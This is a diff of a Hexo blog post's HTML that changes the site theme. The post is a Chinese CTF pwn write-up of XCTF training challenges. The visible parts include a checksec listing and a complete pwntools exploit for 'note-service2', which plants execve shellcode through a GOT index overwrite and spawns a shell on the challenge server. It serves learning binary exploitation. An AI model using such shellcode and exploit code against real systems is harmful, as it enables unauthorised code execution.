@@ -1,386 +1,133 @@
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="en">
+<html>
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="theme-color" content="#222">
+    
+
+    
+
+    
 
 
 
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="pwn,canary,栈溢出,ROP,">
-
-
-
-
-
-  <link rel="alternate" href="/atom.xml" title="Apr1L's blog" type="application/atom+xml">
-
-
-
-
-
-
-<meta name="description" content="攻防世界的几道题">
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>攻防世界 | Apr1L&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+    <meta name="keywords" content="pwn,canary,栈溢出,ROP">
+    <meta name="description" content="攻防世界的几道题">
 <meta name="keywords" content="pwn,canary,栈溢出,ROP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="攻防世界">
 <meta property="og:url" content="http://suvii22.github.io/2019/10/08/攻防世界/index.html">
 <meta property="og:site_name" content="Apr1L&#39;s blog">
 <meta property="og:description" content="攻防世界的几道题">
-<meta property="og:locale" content="en">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.loli.net/2020/02/08/IAHJQkjthPfp8gw.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/08/FfT3lhC5N2bksLm.png">
-<meta property="og:updated_time" content="2020-09-18T06:16:48.292Z">
+<meta property="og:updated_time" content="2020-10-25T15:36:49.320Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界">
 <meta name="twitter:description" content="攻防世界的几道题">
 <meta name="twitter:image" content="https://i.loli.net/2020/02/08/IAHJQkjthPfp8gw.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Apr1L&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
 
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://suvii22.github.io/2019/10/08/攻防世界/">
-
-
-
-
-
-  <title>攻防世界 | Apr1L's blog</title>
-  
-
-
-
-
-
-  <script type="text/javascript">
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?1492608f41d9f4aca00f135cccb18cda";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
-
-
-
+    <!-- custom head -->
+    
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+<body>
+    <div id="loading" class="active"></div>
 
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Apr1L's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <aside id="menu"  >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Apr1L</h5>
+          <a href="mailto:undefined" class="mail">
+        </hgroup>
+      </div>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+      </ul>
+    </div>
   </div>
+</aside>
 
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">攻防世界</div>
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            Home
-          </a>
-        </li>
-      
         
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
-            
-            About
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
-            
-            Tags
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
-            
-            Categories
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            Archives
-          </a>
-        </li>
-      
+    </div>
+</header>
+<header class="content-header post-header">
 
-      
-    </ul>
-  
-
-  
-</nav>
+    <div class="container fade-scale">
+        <h1 class="title">攻防世界</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-10-08T12:16:50.000Z" itemprop="datePublished" class="page-time">
+  2019-10-08
+</time>
 
 
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/wp/">wp</a></li></ul></li></ul>
 
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
             
+        </h5>
+    </div>
 
-  <div id="posts" class="posts-expand">
     
 
-  
 
-  
-  
-  
+</header>
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/10/08/攻防世界/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Apr1L">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/logo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Apr1L's blog">
-    </span>
-
+<div class="container body-wrap">
     
-      <header class="post-header">
 
-        
-        
-          <h1 class="post-title" itemprop="name headline">攻防世界</h1>
-        
+<article id="post-攻防世界"
+  class="post-article article-type-post fade" itemprop="blogPost">
 
+    <div class="post-card">
+        <h1 class="post-card-title">攻防世界</h1>
         <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-08T20:16:50+08:00">
-                2019-10-08
-              </time>
-            
+            <time class="post-time" title="2019-10-08 20:16:50" datetime="2019-10-08T12:16:50.000Z"  itemprop="datePublished">2019-10-08</time>
 
             
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/wp/">wp</a></li></ul></li></ul>
+
+
 
             
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/wp/" itemprop="url" rel="index">
-                    <span itemprop="name">wp</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <blockquote class="blockquote-center"><p>攻防世界的几道题</p>
-</blockquote>
-
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>攻防世界的几道题</p>
 <a id="more"></a>
 
 <h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec babystack</span><br><span class="line">CANARY    : <span class="type">ENABLED</span></span><br><span class="line">FORTIFY   : <span class="type">disabled</span></span><br><span class="line">NX        : <span class="type">ENABLED</span></span><br><span class="line">PIE       : <span class="type">disabled</span></span><br><span class="line">RELRO     : <span class="type">FULL</span></span><br></pre></td></tr></table></figure>
@@ -459,264 +206,90 @@
 <h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#p = process('./note')</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'37156'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(ch)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,str(ch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">'content:'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    idx=(elf.got[<span class="string">'free'</span>]<span class="number">-0x2020A0</span>)/<span class="number">8</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">8</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">    add(idx,<span class="number">8</span>,<span class="string">'\x48\x31\xf6\x90\x90\xeb\x19'</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">8</span>,<span class="string">'\xb8\x3b\x00\x00\x00\xeb\x19'</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">8</span>,<span class="string">'\x48\x31\xd2\x90\x90\xeb\x19'</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">8</span>,<span class="string">'\x0f\x05\x90\x90\x90\x90\x90'</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-            <a href="/tags/canary/" rel="tag"># canary</a>
-          
-            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
-          
-            <a href="/tags/ROP/" rel="tag"># ROP</a>
-          
         </div>
-      
 
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/27/wiki/" rel="prev" title="wiki">
-                wiki <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://suvii22.github.io">
+            <img src="/" alt="Apr1L">
+            Apr1L
+        </a>
     </footer>
-  </div>
-  
-  
-  
-  </article>
+</blockquote>
+
+        
 
 
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/">ROP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/canary/">canary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/栈溢出/">栈溢出</a></li></ul>
 
 
-          </div>
-          
-
-
-          
-
-  
-
+            
 
 
         </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
-  </div>
 
-  <aside id="sidebar" class="sidebar">
     
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/logo.jpg" alt="Apr1L">
-            
-              <p class="site-author-name" itemprop="name">Apr1L</p>
-              <p class="site-description motion-element" itemprop="description">二进制萌新QAQ</p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/">
-              
-                  <span class="site-state-item-count">16</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
-                  <span class="site-state-item-name">categories</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">11</span>
-                  <span class="site-state-item-name">tags</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
-            </div>
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序"><span class="nav-number">1.1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">1.2.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#相关链接"><span class="nav-number">1.3.</span> <span class="nav-text">相关链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-100"><span class="nav-number">2.</span> <span class="nav-text">pwn-100</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DynELF"><span class="nav-number">2.1.</span> <span class="nav-text">DynELF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用条件"><span class="nav-number">2.2.</span> <span class="nav-text">使用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-number">2.3.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#相关链接-1"><span class="nav-number">2.4.</span> <span class="nav-text">相关链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mary-Morton"><span class="nav-number">3.</span> <span class="nav-text">Mary_Morton</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序-1"><span class="nav-number">3.1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#确定偏移"><span class="nav-number">3.2.</span> <span class="nav-text">确定偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击"><span class="nav-number">3.3.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stack2"><span class="nav-number">4.</span> <span class="nav-text">stack2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#welpwn"><span class="nav-number">5.</span> <span class="nav-text">welpwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-number">5.1.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Time-formatter"><span class="nav-number">6.</span> <span class="nav-text">Time formatter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#note-service2"><span class="nav-number">7.</span> <span class="nav-text">note-service2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">7.1.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-number">7.2.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/10/27/wiki/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">wiki</h4>
+      </a>
     </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Apr1L</span>
+  
 
   
+</nav>
+
+
+
+    
+
+</article>
+
+
+
 </div>
 
-
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
-
-
-
-
+        <footer class="footer">
+    <div class="top">
         
 
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Apr1L &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
 
 
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: , REWARD: false };
 
 
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
 </script>
 
+<script src="/js/main.min.js?v=1.7.2"></script>
 
 
 
@@ -725,142 +298,7 @@
 
 
 
-  
 
-
-  
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
 
 </body>
 </html>
